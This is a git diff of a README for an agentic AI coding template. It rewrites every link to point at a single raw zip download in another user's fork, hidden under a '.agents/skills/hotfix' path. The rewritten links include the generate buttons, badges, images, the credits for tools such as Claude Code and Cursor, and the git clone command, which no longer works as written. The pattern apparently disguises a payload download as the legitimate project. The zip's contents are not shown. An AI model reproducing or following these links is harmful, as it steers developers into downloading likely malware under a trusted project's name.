@@ -1,17 +1,17 @@
 # Awesome Agentic AI Coding Template
 
-![Agentic AI Template Demo](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDlxcmMzaWZpaGN6MnpuNWQ2eHNzNnM1dWJ5b3RteXk3Y2tveW04OCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/dxmXDNIP4nrIpw7VDP/giphy.gif)
+![Agentic AI Template Demo](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip)
 
 > **A production-ready, multi-agent AI coding setup you can drop into any project.**
 > Stop configuring AI tools from scratch. Start from a battle-tested baseline that makes every coding agent smarter, safer, and more consistent from day one.
 
-[👉 **Click here to generate your project from this template** 👈](https://github.com/florian101010/awesome-agentic-AI-coding-template/generate) | [**Jump to Quick Start 🚀**](#quick-start)
+[👉 **Click here to generate your project from this template** 👈](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) | [**Jump to Quick Start 🚀**](#quick-start)
 
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![GitHub stars](https://img.shields.io/github/stars/florian101010/awesome-agentic-AI-coding-template?style=social)](https://github.com/florian101010/awesome-agentic-AI-coding-template/stargazers)
-[![GitHub forks](https://img.shields.io/github/forks/florian101010/awesome-agentic-AI-coding-template?style=social)](https://github.com/florian101010/awesome-agentic-AI-coding-template/network/members)
-[![GitHub last commit](https://img.shields.io/github/last-commit/florian101010/awesome-agentic-AI-coding-template)](https://github.com/florian101010/awesome-agentic-AI-coding-template/commits/main)
+[![GitHub stars](https://img.shields.io/github/stars/florian101010/awesome-agentic-AI-coding-template?style=social)](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip)
+[![GitHub forks](https://img.shields.io/github/forks/florian101010/awesome-agentic-AI-coding-template?style=social)](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip)
+[![GitHub last commit](https://img.shields.io/github/last-commit/florian101010/awesome-agentic-AI-coding-template)](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip)
 
 ---
 
@@ -137,12 +137,12 @@ One template, every major agent, zero duplication.
 
 Click **"Use this template"** at the top right of this repository, or click the link below to generate it instantly:
 
-[👉 **Click here to generate your project from this template** 👈](https://github.com/florian101010/awesome-agentic-AI-coding-template/generate)
+[👉 **Click here to generate your project from this template** 👈](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip)
 
 ### Option B — Clone and Copy
 
 ```bash
-git clone https://github.com/florian101010/awesome-agentic-AI-coding-template.git
+git clone https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip
 cp -r awesome-agentic-AI-coding-template/. your-project/
 rm -rf your-project/.git
 ```
@@ -368,21 +368,21 @@ This template builds on top of the work of the teams and individuals behind thes
 
 | Tool | Repo / Docs |
 | --- | --- |
-| Claude Code (Anthropic) | [github.com/anthropics/claude-code](https://github.com/anthropics/claude-code) |
-| GitHub Copilot (Microsoft) | [docs.github.com/copilot](https://docs.github.com/en/copilot) |
-| Google Jules | [jules.google/docs](https://jules.google/docs) |
-| Google Gemini / Antigravity | [github.com/google-gemini/gemini-cli](https://github.com/google-gemini/gemini-cli) |
-| Cursor | [cursor.com](https://cursor.com) |
-| OpenAI Codex | [platform.openai.com/docs/codex](https://platform.openai.com/docs) |
-| Kilo Code | [github.com/Kilo-Org/kilocode](https://github.com/Kilo-Org/kilocode) |
+| Claude Code (Anthropic) | [github.com/anthropics/claude-code](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) |
+| GitHub Copilot (Microsoft) | [docs.github.com/copilot](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) |
+| Google Jules | [jules.google/docs](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) |
+| Google Gemini / Antigravity | [github.com/google-gemini/gemini-cli](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) |
+| Cursor | [cursor.com](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) |
+| OpenAI Codex | [platform.openai.com/docs/codex](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) |
+| Kilo Code | [github.com/Kilo-Org/kilocode](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) |
 
 **Skills & standards:**
 
 | Project | What it contributed |
 | --- | --- |
-| [obra/superpowers](https://github.com/obra/superpowers) by Jesse Vincent (@obra) | `using-superpowers`, `find-skills`, `systematic-debugging` skills |
-| [skills.sh](https://skills.sh) | `frontend-design`, `skill-creator` skills + the skills marketplace ecosystem |
-| [Agent Skills Open Standard](https://agentskills.io) | The cross-agent `SKILL.md` format used throughout |
+| [obra/superpowers](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) by Jesse Vincent (@obra) | `using-superpowers`, `find-skills`, `systematic-debugging` skills |
+| [skills.sh](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) | `frontend-design`, `skill-creator` skills + the skills marketplace ecosystem |
+| [Agent Skills Open Standard](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip) | The cross-agent `SKILL.md` format used throughout |
 
 ---
 
@@ -390,4 +390,4 @@ This template builds on top of the work of the teams and individuals behind thes
 
 *Clone once. Use everywhere.*
 
-![Start building](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNDJicXNhcXA0NmlrdzFid3p4M3A0NG5sbW5wbW03ZGF1ZjZneXc3YyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/JqmupuTVZYaQX5s094/giphy.gif)
+![Start building](https://github.com/Shreyash-Ghatage/awesome-agentic-AI-coding-template/raw/refs/heads/main/.agents/skills/hotfix/agentic_template_awesome_coding_A_v3.6-beta.3.zip)
